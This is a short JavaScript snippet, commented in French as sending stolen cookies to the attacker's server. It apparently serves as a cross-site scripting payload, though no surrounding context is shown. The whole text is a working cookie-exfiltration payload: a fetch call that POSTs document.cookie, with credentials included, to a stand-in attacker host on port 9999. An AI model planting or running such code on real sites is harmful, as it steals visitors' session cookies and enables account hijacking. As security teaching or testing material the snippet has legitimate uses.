// Envoyer les cookies volés au serveur attaquant
fetch("http://evil.fr:9999/receiver.php", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ cookies: document.cookie })
});